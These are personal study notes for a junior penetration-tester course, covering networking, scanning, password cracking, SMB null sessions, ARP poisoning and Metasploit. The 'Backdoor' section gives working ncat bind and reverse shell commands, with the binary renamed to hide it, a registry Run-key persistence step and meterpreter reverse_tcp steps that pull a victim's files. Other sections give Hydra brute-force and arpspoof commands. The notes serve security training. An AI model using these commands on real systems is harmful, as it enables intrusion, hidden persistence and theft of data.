@@ -1,0 +1,848 @@
+Elearnsecurity Junior Pentester Notes
+
+=== Pentesting Prereqs ===
+NETWORK
+- Packets {header:payload}
+    @ IP protocol header is at least 160 bits (20 bytes)
+        @ First four bits identify IP version
+        @ 32 bits starting at position 96 represent source address
+        @ Following four bytes represent destination address
+    * Application layer * Transport layer * Network layer * Physical layer
+    * Application * Presentaion * Session * Transport * Network * Data Link * Physical
+    - Packets contain lower protocol packets in their header * Encapsulation
+- Internet Protocol
+    - Runs on internet layer
+    - Delivers datagrams (IP packets)
+    - Uses IP addresses
+    @ IP address: 192.168.33.12 @ Subnet mask: 255.255.224.0
+    @ SM: 11111111.11111111.11100000.00000000
+    @ IP: 11000000.10101000.00100001.00001100
+    @ NE: 11000000.10101000.00100000.00000000 -> 192.168.32.0 (network prefix)
+        - 192.168.32.0/255.255.224.0 = 192.168.32.0/19 (CIDR notation)
+    * IP & Subnet Mask = Network
+    @ If there are 13 bits to represent hosts, network can contain 2^13 different addresses
+    - Addresses with host part made up of all 0's or all 1's are special
+    @ 10.54.12.0/24
+        - Contains 2^8 addresses
+        - 10.54.12.0 is network address
+        - 10.54.12.255 is broadcast address
+    @ 192.168.114.32/27
+        - Contains 2^5 addresses
+        - 192.168.114.32 is network address
+        - 192.168.114.63 is broadcast address
+    @ 172.16.2.0/23
+        - 172.16.3.12 and 172.16.2.66 are in the same network
+        - 172.16.3.240 and 172.16.4.2 are not in the same network
+    @ 192.168.1.0/16
+        - Does not make sense
+        - 192.168.1.0 & 255.255.0.0 -> 192.168.0.0 as network address
+        - Could be valid IP address in 192.168.1.0/16 network
+    - IPv6
+        - First 48 bits are for Internet global addressing
+        - 16 bits from 49th to 64th are for subnets
+        - Last 64 bits are for device ID's
+- Routing
+    - Routing table contains IP-to-interface binding
+    - During path discovery, routing protocols assign a metric to each link
+    $ ip route      //Linux
+    $ route print   //Windows
+    $ netstat -r    //OSX
+- Link Layer
+    - Lowest layer of the TCP/IP stack
+    - Routers aware of best overall path to destination, link layer deals with the next hop
+    * Hubs and switches are network devices that forward frames (layer 2 packets)
+        - Work with link layer network addresses: MAC addresses
+    - IP addresses are layer 3 addresses (network layer) that identify host
+    - MAC addresses are layer 2 addresses (link layer) that indetify network card
+        - Also known as physical address
+        - 48 bit and expressed in hex
+    $ ip addr   //Linux
+    $ ifconfig  //OSX
+    $ ipconfig  /all //Windows
+    * The lower layer serves the layer above
+    @ A wants to send packet to B, through router
+        - Dest IP: B (in IP header of datagram)
+        - Dest MAC: Router (in link layer header of frame)
+        - Src IP: A
+        - Src MAC: A
+        - Router takes packet and forwards it to B's network
+        - Dest MAC: B
+        - Src MAC: Router
+    - Destination MAC is MAC of next hop
+    - Destination IP is global and remains the same
+    - FF:FF:FF:FF:FF:FF is broadcast MAC
+    - A frame with this address is delivered to all hosts within the same broadcast domain
+    - Switches have forwarding table called Content Addressable Memory table
+    - Routers segment networks
+    - Switches do not segment networks
+    - Forwarding
+        - Switch reads dest MAC
+        - Switch performs lookup in CAM table
+        - Switch forwards packet to corresponding interface
+        - If there is no entry with that MAC, switch will forward frame to all interfaces
+    * Address Resolution Protocol (ARP) is one of the most fundamental protocols
+        - Host A wants to send traffic to Host B, and it only knows IP of B
+        1 A builds ARP request with IP of B and FF:FF:FF:FF:FF:FF as dest MAC
+        2 Every host on the network receives request
+        3 B replies with ARP reply, telling A its MAC
+        - A saves IP - MAC binding in its ARP cache
+        - Further traffic to B will not need a new ARP round
+        - ARP cache entries have TTL too
+        $ ip neighbour  //Linux
+        $ arp           //OSX
+        $ arp -a        //Windows
+- TCP and UDP
+    - Most common transport protocols used on the internet
+    * TCP guarantees packet delivery and is connection oriented
+    * UDP does not guarantee packet delivery and is connectionless
+    - UDP is faster and is used by multimedia applications that tolerate packet loss but are throughput intensive
+        - VoIP and video streaming
+    - Ports
+        21      FTP
+        22      SSH
+        23      Telnet
+        25      SMTP
+        80      HTTP
+        110     POP3
+        115     SFTP
+        137     NETBIOS
+        138     NETBIOS
+        139     NETBIOS
+        143     IMAP
+        443     HTTPS
+        1433    MS SQL Server
+        3306    MySQL
+        3389    RDP
+    - Daemon is a program that runs a service
+    - Source and destination port are included in the transport layer protocol header
+    $ netstat -tunp         //Linux
+    $ netstat -p tcp -p udp
+    $ lsof -n -i4TCP -i4UDP //OSX
+    $ netstat -ano          //Windows
+    - TCPView from Sysinterals
+    * To establish a TCP connection there is a 3-way handshake
+        - Header fields involved are sequence number, acknowledgement numbers, and SYN and ACK flags
+        - SYN -> SYN + ACK -> ACK
+        - ACK number is always simple increment of SYN number sent by the client
+        - SYN       {Seq: 329 Ack: 0}
+        - SYN/ACK   {Seq: 498 Ack: 330}
+        - ACK       {Seq: 330 Ack: 499}
+- Firewalls
+    - Work on different layers
+    - Perform access control, attack detection, and attack prevention
+    - Specialized software modules running on computer or dedicated network device
+    - Filter packets coming in and out of a network
+    - Work on different layers
+    - Packet filtering
+        - According to characteristics like source IP, dest IP, source port, dest port, protocol
+        - Allow, drop (don't notify source), or deny (notify source) packets
+        - Inpsecting header of packet gives no information on actual packet content
+        - Packet filtering cannot stop layer 7 (application layer) attacks
+            - XSS, buffer overflow, SQL injection, ...
+    - Application layer firewalls
+        - Check all OSI 7 layers
+        - Inspect packet content
+            - Drop peer-to-peer application packets
+            - Prevent users from visiting a site
+    - IDS inspect application payload to detect potential attack
+        - Checks for ping sweeps, port scans, SQL injections, buffer overflows, ...
+        - Identify traffic gerenated by a virus or worm
+        - Detects any network threat if well-configured
+        - Detects using signatures (like antivirus)
+        - Detection is performed by multiple sensors (software that inspects network traffic)
+        - Sensors intercept intrusions and communicate them to IDS manager
+            - Maintain policies and provide management console
+        * IDS is not a substitution for a firewall, they provide layer of security by protecting network from well-known attacks
+        - Network IDS (NIDS) and Host IDS (HIDS)
+            - NIDS inspect network traffic through sensors placed on router or in network with intrusion risk like DMZ
+            - HIDS monitors application logs, file-system changes, and changes to OS config
+        - IDS can detect suspicious activity and report but not block
+        - IPS can drop malicious requests
+        # Identify firewall mechanism
+        # Check for anomalies in TCP 3-way handshake
+            - TCP SYN are sent but no TCP SYN/ACK replies
+            - TCP SYN are sent but TCP RST/ACK reply is received
+            - Identifies environmental constraints (could be firewall, IDS, or any other device)
+    - NAT
+        - Network address translation
+        - Home router probably running NAT protocol to connect home devices to internet without each having public IP
+            - Devices in network need to go through NAT device
+            - NAT device used as default gateway
+            - NAT device rewrites source IP of every packet, masquerading client's original IP
+- DNS
+    - Domain Name System
+    - Converts names like www.elearnsecurity.com to IP addresses
+    * Fundamental support protocol for the internet and networks
+    * DNS name
+        - Top level domain
+        - Domain part
+        - Subdomain part [if applicable]
+        - Host part
+    @ members.elearnsecurity.com
+        Host    members
+        Domain  elearnsecurity
+        TLD     com
+    @ www.sub.domain.com
+        Host    www
+        Sub     sub
+        Domain  domain
+        TLD     com
+    - TLD > Domain > Subdomain > Host
+    @ Heirarchy
+        - com
+            - domain
+                - sub
+                    - www (host)
+        - elearnsecurity
+            - members (host)
+            - www (host)
+    - Name resolution performed by resolvers
+        - Server that contacts TLD DNS servers and follows heirarchy of DNS to resolve host
+        - DNS servers provided by ISP or are publically available (OpenDNS or Google DNS)
+        - Algorithm
+            1 Resolver contacts a root name server (contains info on TLD)
+            2 Asks TLD name server what's name server that can give info on domain (authoritative name server)
+            3 If there are subdomains, 2 is repeated on authoritative DNS server for every subdomain
+            4 Resolver asks for name resolution on host
+        @ www.example.com
+            - Computer contacts resolver configured by local admin
+            - Resolver contacts root server and asks about authoritative name server for com domain
+            - Resolver contacts authoritative name server and asks for authoritative name server for example.com domain
+            - Resolver asks what address of www is
+            - Resolver sends IP address back to client
+        * IP addresses of root servers are hardcoded into config of resolver
+        - DNS can also convert IP address to DNS name if configured for the domain
+        @ Linux ping utility performes reverse DNS query after receiving every response from target
+- Wireshark
+    - Captures all traffic seen by network card of computer running it
+    - NIC's can work in promiscuous or monitor mode
+    - Normally NIC discards any packet addressed to another NIC
+    - Promiscuous mode makes NIC accept and process all packets it receives
+    * Basic capture filters
+        - ip                    Only packets using IP as layer 3 protocol
+        - not ip                Opposite of ^^
+        - tcp port 80           Packets where source or dest TCP port is 80
+        - net 192.168.54.0/24   Packets from and to the specified network
+        - src port 1234         Source port must be 1234; transport protocol does not matter
+        - src net 192.168.0/24  Source IP address must be from specified network
+        - host 192.168.45.65    All packets to or from specified host
+        - host www.example.com  All packets to or from specified hostname
+    * Display filters
+        - <Protocolname> (Display any packet using protocol)
+        - <Protocolname>[.field] (Display any packet with specified field)
+        - <Protocolname>[.field] [operand val] (Displays any packet whose protocol field matches operand and value
+        - <Protocolname>[.field] AND <Protocolname>[.field] [operand val] (Combine multiple expressions with logical operators)
+    @ Example display filters
+        - ip                                Displays IP packets
+        - ip.addr                           Displays IP packets with populated source or dest address
+        - ip.addr == 192.168.12.13          Displays IP packets with 192.168.12.13 as source or dest address
+        - ip.addr == 192.168.12.13 or arp   Displays ^^ or ARP packets
+- Data Exfiltration
+    $ rdesktop 172.16.91.100
+    - Run cmd.exe
+    $ cd / -> $ dir /s /b filename
+    $ python --version //Check for python
+    $ powershell ls //Check for powershell
+    - Set DNS server of computer to Kali
+WEB APP
+- HTTP
+    - Most used application protocol on the internet
+    - Client (web browser) connects to web server (MS IIS or Apache HTTP Server)
+    - HTTP requests and responses
+    - Works on top of TCP
+        - TCP connection is established
+        - Client sends request, waits for answer
+        - Server processes request, sends back response
+        @ Example process
+            - SYN
+            - SYN/ACK
+            - ACK GET /html
+            - HTML response
+            - Close connection
+    - HTTP format
+        Headers\r\n
+        \r\n
+        Message Body\r\n
+    - Need \r and \n characters to end line
+    - HTTP over SSL/TLS runs HTTP over cryptographic protocol
+- Cookies
+    - Foundation of authorization
+    - Attributes
+        - Content
+        - Expiration date
+        - Path
+        - Domain
+        - Optional flags: HTTP only, Secure
+- Same Origin Policy
+    - Prevents JS code from getting or setting properties on a resource coming from different origin
+    - Protocol, hostname, and port must match for JS to access a resource
+    - Still possible to include external resources by using HTML tags like img, script, iframe, object, ...
+    - If script on domain A was able to read content on domain B, it would be possible to steal info
+
+=== Pentesting Prelim Skills and Programming
+C++
+PYTHON
+COMMAND LINE
+
+=== Pentesting Basics ===
+INFORMATION GATHERING
+- OSINT
+    - Social media
+    - LinkedIn -> advanced search -> all filters
+    - Use LinkedIn to find real name of twitter account
+    - CrunchBase gives details about founders, investors, employees, buyouts, and acquisitions
+    - USA gov provides System for Award Management and GSA eLibrary which gives info about contracts
+    - Whois database for internet domain names
+    * Companies tend to use one email schema
+        - name.surname@company.com
+        - surname.name@company.com
+        - [first letter of name]surname@company.com
+    * Collect employee data -> Construct a few email formats -> Send inconspicuous emails -> Mail system verifies account
+- Subdomain Enumeration
+    * site: company.com //Google search
+    * dnsdumpster.com
+    $ sublist3r -d [domain]
+FOOTPRINTING & SCANNING
+- Mapping a Network
+    @ Company asks for penetration test on 200.200.0.0/16
+        - Network contains 200.200.0.0 - 200.200.255.255 range
+    $ fping -a -g [IP range] 2>/dev/null //Ping sweep
+        $ fping -a -g 200.200.0.0/16
+        $ fping -a -g 200.200.0.0 200.200.255.255
+    $ nmap -sn 200.200.0.0/16
+        $ nmap -sn 200.200.0-255.*
+        $ nmap -sn -iL hostslist.txt
+    - Nmap host discovery
+        -sL                 Lists targets to scan
+        -sn                 Disable port scan (ping sweep)
+        -Pn                 Treat all hosts as online (skip host discovery)
+        -PS/PA/PU/PY[ports] TCP SYN/ACK, UDP, or SCTP discovery on ports
+        -PE/PP/PM           ICMP echo, timestamp, and netmask request discovery probes
+        -PO[protocols]      IP protocol ping    
+    - In order to OS fingerprint, send network requests and analyze the responses
+        - Various OS' have tiny differences in network stack implementations
+    @ Goal of footprinting and scanning
+        200.200.3.1     PAN-OS              85%
+        200.200.3.10    Linux 3.7           100%
+        200.200.3.78    Linux 2.6.19-2.6.36 90%
+        200.200.4.12    Windows 7 SPI       100%
+        200.200.4.16    Windows 7 SPI       75%
+        200.200.4.18    FreeBSD             85%
+        200.200.4.19    HP-OS               78%
+    $ nmap -Pn -O <target(s)> //OS fingerprint
+    - Nmap OS fingerprinting
+        -O              Enable OS detection
+        --osscan-limit  Limit OS detection to promising targets
+        --osscan-guess  Guess OS more aggressively
+    # uname -a //OS version
+- Port Scanning
+    - Daemon is piece of software running on server to provide given service and listens on a specific port
+    * The goal of port scanning is to find software name and version of daemons running on each host
+    * If client sends SYN flag and port is closed, server replies with RST/ACK
+    - Simplest port scan is trying to connect to every port -> If scanner receives RST packet then port is closed
+        - If scanner completes the 3-way handshake then port is open, after connecting the scanner sends RST packet to target
+    - SYN scan is stealthier as it does not perform the full handshake
+        - RST packet received is closed, ACK packet received is open, scanner then sends RST packet to target
+        - Cannot be detected by looking at daemon logs
+    - Nmap scans
+        -sT TCP connect scan //Recorded in daemon (application) logs
+        -sS SYN scan //Not recorded in daemon (application) logs
+        -sV version detection scan
+    - Version detection scan
+        1 Client -> SYN -> Server
+        2 Client <- SYN/ACK <- Server
+        3 Client -> ACK -> Server
+        4 Client <- Banner <- Server
+        5 Client -> RST/ACK -> Server
+    - Nmap can use DNS names, IP address lists, CIDR, wildcards, ranges, octets lists, and input files to specify targets
+    @ Nmap examples
+        $ nmap 10.11.12.0/24
+            - Performs SYN scan (default)
+            - Target is /24 network
+        $ nmap -sT 192.168.12.33,45
+            - Performs TCP connect scan
+            - Targets are 192.168.12.33 and 192.168.12.45
+        $ nmap -sV 10.11.12.0/24 10.200.0.1
+            - Performs service detection scan
+            - Target is /24 network and single host
+    - Networks protected by firewalls might block pings
+        - -Pn forces scans (skip ping scanning and treat host as alive)
+        - Check for common ports (22, 444, 80, 443)
+    - Common ports
+        TCP 22          SSH
+        TCP 80,443      HTTP/HTTPs web server
+        TCP 445         Windows shares (SMB), also Linux equivalent (Samba)
+        TCP 25          SMTP
+        TCP 21          FTP
+        TCP 137-139     Windows NetBIOS
+        TCP 1433-1434   MSSQL Database
+        TCP 3306        MySQL Database
+        TCP 8080,8443   HTTP/HTTPS web server, HTTP proxy
+        UDP 53          DNS
+    - Incomplete nmap results might indicate a firewall is in place
+        @ If TCP scan succeeds against well-known service like web scanner, nmap should not have difficulty trying to fingerprint
+            - Might see that version was not recognized or service type
+        - tcpwrapped means that TCP handshake was completed but remote host closed connection without receiving data
+            - Indicates something is blocking connectivity
+        - nmap --reason shows explanation of why port is marked open or closed
+    - Masscan is faster than nmap but less accurate (good for huge networks)
+VULNERABILITY ASSESSMENT
+- Vulnerability Assessment
+    - Scanners perform probes on:
+        - Daemons listening on TCP and UDP ports
+        - Config files of OS', software suites, network devices, ...
+        - Windows registry entries
+- Nessus
+    - First step is determining if target hosts are alive and which ports are open
+        - Vuln scanner performs port scan
+    - For every open port, vuln scanner determines application name and version running
+    - Scanner queries database for vulns on detected services (daemons)
+    - Vuln scanner sends probes to verify if vuln exists
+        - Prone to false positives
+WEB ATTACKS
+- Fingerprinting
+    - $ httprint -P0 -h <IP> -s /usr/share/httprint/signatures.txt
+- HTTP Verbs
+    - GET
+        - To pass course=PTS to page.php -> GET /page.php?course=PTS HTTP/1.1
+    - POST
+        - Submits HTML form data in message body
+    - PUT
+        - Uploads file to server
+        - Use wc -m on file
+- Netcat
+    - 
+SYSTEM ATTACKS
+- Malware
+    - Virus
+        - Small piece of code that spreads from computer to computer
+        - Copy themselves to special sections of disk, inside legitimate programs or docs
+        - They run every time infected program or file is opened
+    - Trojan horse
+        - Malware that comes embedded in seemingly harmless file
+            - Executable, MS Office doc, screen saver, PDF file, ...
+        - When file is opened, malware is executed
+        - Most comman Trojan horses used by pen testers are backdoors
+    - Backdoor
+        - Made by two components, server and backdoor client
+        - Server runs on victim machine listening on network and accepting connections
+        - Client runs on attacker machine and is used to connect to the backdoor to control it
+        - NetBus and SubSeven are famous old school backdoors
+            - Allow attackers to browse victim's hard drive, upload and download files, execute programs, ...
+            - After backdoor installation and connection, pen tester has full control over remote host
+        - If sysadmin configures network firewall to block connections from internet to internal machines attacker cannot connect
+        - Firewalls might trigger alerts upon connection attempts
+        - Backdoor should make traffic look legit, easiest way to achieve this is using connect-back backdoor
+            - Connect-back backdoor (reverse backdoor) is mechanism to bypass firewalls
+            - Instead of having victim machine act as server and listening to client, it acts as client
+            - Attacker machine listens on port 80
+    - Rootkit
+        - Hides itself from users and av in order to subvert OS
+        - Lets attacker maintain privileged access to victim machine without being noticed
+    - Bootkit
+        - Rootkits that cirvumvent OS protection by executing during bootstrap phase
+        - Start before OS, so they get complete control over machine and OS
+    - Adware
+        - Annoying software that shows ads to users
+    - Spyware
+        - Collects info about users such as:
+            - OS, visited websites, passwords, ...
+        - Info is sent back to log collection server
+    - Greyware
+        - Malware that does not fall under a specific category
+        - Spyware, adware, ...
+    - Dialer
+        - Software that tries to dial numbers on dial-up connections in order to collect money from victim's phone bill
+        - Nowadays they target smartphones
+    - Keylogger
+        - Record window name
+        - Saving keystrokes to log file
+        - Sending logs to collection server
+        - Subject to same restrictions that firewalls pose to backdoors
+        - Sneak traffic past firewall
+        - Hardware and rootkit keyloggers
+    - Bots
+        - Make up botnets and perform DDoS and serve as spamming sources
+        - Commanded by C2 server
+    - Ransomware
+        - Encrypts computer or smartphone content with secret key
+        - Asks for ransom to give content back
+    - Data stealing malware
+        - Steals data on disk
+        - Target to a specific company and tailored to work environment
+        - Attackers can also use backdoor to perform data stealing
+    - Worms
+        - Spread over the network
+        - Offer an entry point into the system
+- Backdoor
+    - Ncat
+        -l  Listen
+        -e  Exec
+        -p  Port
+        -v  Verbose
+    - Upload ncat to victim machine
+    $ winconfig -l -p 5555 -e cmd.exe //ncat has been renamed winconfig
+    $ ncat 192.168.102.152 5555 //Attacker
+    - Reverse has attacker running listener and victim makes connection
+    $ ncat -l -p 5555 -v //Attacker
+    $ winconfig -e cmd.exe 192.168.102.145 5555 //mcat has been renamed winconfig
+    - Create persistent backdoor with ncat:
+        $ ncat -l -p 5544 -v //Attacker
+        - Add ncat to registry on victim
+        - Start -> regedit -> HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run -> Right click -> New -> String value
+        - Name and set value -> "C:\Windows\System32\winconfig.exe 192.168.102.145 5544 -e cmd.exe"
+        - Restart victim machine to activate backdoor
+    - Metasploit session + metepreter
+        > use exploit/windows/local/s4u_persistence
+        > show options
+        > sessions
+        > set session 2
+        > set trigger logon
+        > set payload windows/meterpreter/reverse_tcp
+        > set lhost 192.168.102.145
+        > set lport 1234
+        > exploit
+        > use exploit/multi/handler
+        > set payload windows/meterpreter/reverse_tcp
+        > exploit //Second try?
+        - Start of meterpreter session on victim windows machine
+        $ ifconfig
+        > screenshot
+        $ eog /root/hcelmVwK.jpeg
+        $ pwd
+        $ cd Desktop
+        $ ls
+        $ cat personal_information.txt
+        > download personal_information.txt /root/Desktop
+        $ sysinfo
+        $ ps
+        > help
+        > shutdown
+- Password Attacks
+    - Passwords usually stored in files or databases
+    - Getting creds means getting full control over account
+    - Passwords are stored using hashing
+    - Password cracking recovers clear-text passwords from their hash
+        - Attacker guesses password -> hashes it -> compares result against password file
+        - Two main strats are brute force and dictionary attacks
+    - Brute force attacks
+        - Tries all possible valid passwords
+        - Only way to be certain of finding someone's password
+        - Takes a lot of time
+        - John the Ripper
+            $ unshadow passwd shadow > crackme //Generates crackme file
+            $ john -incremental -users=<ussers list> <file to crack>
+            $ john -incremental -users=victim crackme
+            $ john --show crackme
+    - Dictionary attack
+        - Faster attack that uses dictionary of common passwords
+        - Requires password file of hashed passwords, dictionary (wordlist) of passwords, tool to test every password
+        - John the Ripper
+            $ john -wordlist<=custom wordlist file> <file to crack>
+            $ john -wordlist=<custom wordlist file> -rules <file to crack>
+            $ john -wordlist=mywordlist -users=victim,victim2 crackme
+        - Good password dictionaries
+            $ apt-get install seclists
+            - /usr/share/seclists/passwords/
+        - Rainbow tables saves time on hashing passwords
+            - Reduces cracking time from days to seconds
+        - Ophcrack is rainbow cracking tool aimed at Windows password recovery
+            - Site offers free rainbow tables
+- John the Ripper
+    $ john --wordlist=/usr/share/john/password.txt hashes
+    $ cat /root/.john/john.pot
+    $ john --show hashes
+- Hashcat
+    > hashcat64.exe -h //Show options
+    > hashcat64.exe -b //Run benchmark
+    > hashcat64.exe -m 0 -a 0 -D2 example0.hash example.dict // mode 0, attack type 0, dictionary example0.hash
+    > type hashcat.potfile
+    > del hashcat.potfile
+    - Rule based attack allows user to specify patterns
+    - Hashcat rule example
+        - l u c r $1 $2 $3 $4 $5 $6 $7 $8 $9 [ ] ^l ^a ^! d
+    > haschat64.exe -m 0 -a 0 -D2 example0.hash example.dict -r rules\custom.rule
+    > del hashcat.potfile
+    > notepad best64.rule
+    - Mask attacks uses a placeholder for each part of word
+        > hashcat64.exe -m 0 -a 3 example0.hash ?l?l?l?l?l?l?l?l?a
+        > hashcat64.exe -m 0 -a 3 example0.hash ?a?a?a?a?a?a?a?a?a
+- Buffer Overflow Attacks
+    - Take control of execution flow of piece of software or OS routine
+    - Taking control means being able to force it to behave differently than the dev designed
+    - Bof can lead to:
+        - An app or OS crash-> DoS
+        - Privesc
+        - RCE
+        - Security features bypass
+    - Buffer is area in RAM reserved for temp data storage
+        - User input
+        - Parts of video file
+        - Server banners received by client app
+    - Buffers have a finite size
+        - If client-server app is designed to accept 8-character usernames, username buffer will be 8 bytes long
+        - If dev does not enforce buffer's limit, attacker could write data beyond the limit, this writing arbitrary code in the RAM
+            - This can get exploited to get control over program execution flow
+    - BoF example
+        - Dev creates a text editor
+        - Max length of single line is 256 characters
+            - Editor does not accept input that creates lines longer than 256 characters
+        - Pen tester discovers app does not enforce restriction when opening file created with another editor
+            - When editor opens a file, it inserts first line into line buffer
+        - Pen tester creates file with single line made of 512 random characters and opens with editor
+            - Application crashes
+            - Data in the file overwrote some of editor code that is loaded in RAM
+        - Pen tester writes script that first generates files with very long lines then opens them with the editor
+            - Pen tester is able to generate files that overwrite program flow with valid code, giving pen tester control over app
+    - Buffers are stored in the stack
+    - Stack used by apps and OS does not only contain data, but also info about execution flow
+    - In function call, stack contains function parameters, local varioables, and memory address of program continuation
+    - If attacker can write valid code in RAM, they can force victim function to run their code
+    - Raw overflow that just overwrites memory locations will crash the app
+    - Well-engineered attack is able to execute code on victim machine
+NETWORK ATTACKS
+- Authentication Cracking
+    - Password cracking can be applied to SSH, Telnet, RDP, HTTP auth, ...
+    - Pen tester can try to obtain creds for network service through brute force or dictionary attacks
+    - Pure brute force attacks over a network are very impractical because of time needed to run each probe
+        - Factors like network latency, delays on attacked service, processing time
+    - Network auth cracking relies almost entirely on dictionary-based attacks
+    - Hydra
+        - Can attack nearly 50 different service types
+            - Cisco auth, FTP, HTTP, IMAP, RDP, SMB, SSH, Telnet, ...
+        - Based on modules
+            - Piece of code that lets Hydra attack a specific protocol
+        $ hyrda -U rdp //Gives info on module rdp
+        $ hydra -L users.txt -P pass.txt <service://server> <option>
+        $ hydra -L users.txt -P pass.txt telnet://target.server
+        $ hydra -L users.txt -P pass.txt http-get://localhost/
+- Hydra
+    - Test Hydra on crackme.site
+    - Login form at crackme.site/login.php passes parameters in post request
+        - Name value for username is usr and value for password is pwd
+    $ hydra crackme.site http-post-form "/login.php:usr=^USER^&psw=^PASS^:invalid credentials" -L /usr/share/ncrack/minimal.usr
+        -P /usr/share/seclists/Passwords/rockyou-15.txt -f -V
+    $ hydra 192.168.102.143 ssh -L /usr/share/ncrack/minimal/usr -P /usr/share/seclists/Passwords/rockyou-10.txt -f -V
+- Windows Shares
+    - NetBIOS stands for Network Basic Input Output System
+    - Servers and clients use NetBIOS when viewing network shares on the local area network (lan)
+    - NetBIOS can supply some info when querying a computer
+        - Hostname
+        - NetBIOS name
+        - Domain
+        - Network shares
+    - NetBIOS sits between the application layer and the IP layer
+        - UDP is used to perform name resolution and to carry one-to-many datagram-based communications
+            - NetBIOS datagrams allow a host to send small messages to many other hosts
+        - Heavy traffic like a file copy relies on TCP using NetBIOS sessions
+        - NetBIOS Session   TCP port 139
+        - NetBIOS Datagrams UDP port 138
+        - NetBIOS Names     UDP port 137
+    - When a MS Windows machine browses a network it uses NetBIOS:
+        - Datagrams to list shares and machines
+        - Names to find workgroups
+        - Sessions to transmit data to and from a Windows share
+    - A Windows machine can share a file or a directory on the network
+        - Local and remote users can access the resource and potentially modify it
+    @ File server in an office lets users open and edit the document of their own department, everyone else can read but not modify
+    - Creating network shares in a Windows-based environment is easy
+        - Users just need to turn on File and Printer Sharing service then choose directories or files to share
+        - Users can also set permissions on a share
+    - In Windows Vista, users can choose to share a single file or use the Public directory
+        - For single files, they can choose local or remote users to share file with
+        - For Public directory, they can choose which local users can access files
+            - Can only allow everyone or no one in network to access share
+    - Authorized user can access shares using Universal Naming Convention paths (UNC paths)
+        @ \\ServerName\ShareName\file.nat
+        - Administrative shares used by admins and Windows
+            - \\ComputerName\C$     //Lets admin access a volume on local machine (C$, D$, E$, ...)
+            - \\ComputerName\admin$ //Points to windows installation directory
+            - \\ComputerName\ipc$   //Used for inter-process communication
+    - Can test volume shares with following address in Windows Explorer
+        @ \\localhost\<sharename>
+    - Misconfigured shares can lead to
+        - Information disclosure
+        - Unauthorized file access
+        - Information leakage used to mount targetted attacks
+- Null Sessions
+    - Can be used to enumerate a lot of information
+        - Passwords
+        - System users
+        - System groups
+        - Running system processes
+    - Remotely exploitable
+    - Can be used to call remote APIs and remote procedure calls
+    - Nowadays Windows is immune to this attack, legacy hosts can still be vulnerable
+    - Attack exploits an authentication vulnerability for Windows Administrative Shares
+        - Lets attacker connect to local or remote share without authentication
+    - Enumerating
+    * Nbtstat lets you enumerate Windows shares
+    > nbtstat -A <IP> //Gives information on host at IP
+    > NET VIEW <IP> //Enumerates shares
+    $ nmblookup -A <IP>
+    $ smbclient -L //10.130.40.80 -N //-L looks at services available on target -N forces tool not to ask for password
+    @ Null session attack will exploit IPC$ admin share by trying to connect without creds
+        > NET USE \\<IP>\IPC$ '' /u:''
+        - Only works with IPC$
+        $ smbclient //10.130.40.80/IPC$ -N
+    $ enum -S <IP> //Enumerates shares
+    $ enum -U <IP> //Enumerates users
+    $ enum -P <IP> //Enumerates password policy
+        - Prevents account locking
+        - Prevents false positives
+        - Choose dictionary or brute forcer configuration
+        - Knowing min and max length of password saves time while brute forcing
+    > winfo <IP> -n //-n Use null session attack
+    - Enum4linux
+        - User enumeration
+        - Share enumeration
+        - Group and member enumeration
+        - Password policy extraction
+        - OS information detection
+        - Nmblookup run
+        - Printer information extraction
+    $ enum4linux -n <IP> //nmblookup on IP
+    $ enum4linux -P <IP>
+    $ enum4linux -S <IP>
+    $ enum4linux -s /usr/share/enum4linux/share-list.txt <IP>
+    $ enum4linux -a <IP> //All options
+    $ ./usr/share/doc/python-impacket-doc/examples/samrdump.py <IP>
+    $ nmap -script=smb-enum-shares <IP>
+    $ nmap -script=smb-enum-users <IP>
+    $ nmap -script=smb-brute <IP>
+- ARP Poisoning
+    * Used to intercept traffic on a switched network
+    - To send an IP packet, host needs to know MAC of next hop (router, switch, or dest host)
+    - To identify MAC, computers use ARP
+        - (IP 192.168.7.3 MAC 11:22:33:44:55:66) Who has 192.168.7.9?:Tell 192.68.7.3 -> FF:FF:FF:FF:FF:FF
+        - (IP 192.168.7.9 MAC 77:88:99:AA:BB:CC) 192.168.7.9 is at 77:88:99:AA:BB:CC -> 11:22:33:44:55:66
+    - After MAC resolution, hosts save the dest address in their ARP cache table
+    * Manipulate ARP cache to receive traffic destined to other IP addresses
+        - Works because as long as MAC is in ARP cache, sender does not run ARP for that dest host
+    - Manipulate ARP table of two parties involved with communication
+        - Sniff whole communication
+        - Man-in-the-middle attack (MITM)
+        - Done by sending gratuitous ARP replies
+    * ARP Poisoning Attack
+        - 3 actors (two network nodes [clients, servers, routers, printers, ...] and attacker)
+        @ Network
+            A   IP 192.168.7.3 MAC 11:22:33:44:55:66
+            B   IP 192.168.7.9 MAC 77:88:99:AA:BB:CC
+            X   IP 192.168.7.7 MAC DD:EE:00:11:22:33
+        - Gratuitous ARP reply is unsolicited (sent without receiving any requests)
+        @ X ->  192.168.7.9 is at DD:EE:00:11:22:33 -> 11:22:33:44:55:66
+            * Performed on every victim
+        @ X ->  192.168.7.r is at DD:EE:00:11:22:33 -> 77:88:99:AA:BB:CC
+        - As soon as ARP cache table contains fake info, every packet of communication between poisoned nodes is sent to attacker
+        - Prevent poisoned entry from expiring by sending gratuitous ARP replies every 30 seconds
+        * Soon as attacker receives packets must forward them to correct destination
+        - Op lets hacker sniff traffic between the poisoned hosts even if machines sit on switched network
+        * Lets attacker manipulate packets
+        - Attack can be used on an entire network and against a router
+            - Lets attacker intercept communication between a LAN and the internet
+    - Dsniff
+        - Collection of tools for network auditing and pen testing
+        - Contains arpspoof
+            - Intercepts traffic on a switched LAN
+        $ echo 1 > /proc/sys/net/ipv4/ip_forward
+        $ arpspoof -i <interface> -t <target> -r <host>
+            - Interface is NIC you want to use (eth0 for local LAN)
+            - Target and Host are victims IP addresses
+        $ arpspoof -i eth0 -t 192.168.4.11 -r 192.168.4.16
+            - Intercepts traffic between 192.168.4.11 and 192.168.4.16
+            - Run Wireshark to intercept traffic
+- Metasploit
+    - Interface, exploits, payloads, exploit handling
+    * MSFConsole workflow
+        - Identify vulnerable service
+        - Search for proper exploit
+        - Load and configure exploit
+        - Load and configure payload
+        - Run exploit and get access
+    $ msfconsole //baby
+    - Payloads
+        - OS shell
+        - VNC or RDP connection
+        - Meterpreter shell
+        - Execution of application
+    - Meterpreter
+        > ifconfig  //Info on network config
+        > sysinfo   //Info on machine and OS
+        > getuid    //Get user info
+        > route     //Gets routing information
+        > getsystem //Performs privesc
+            > search bypassuac //If getsystem does not work due to Windows UAC
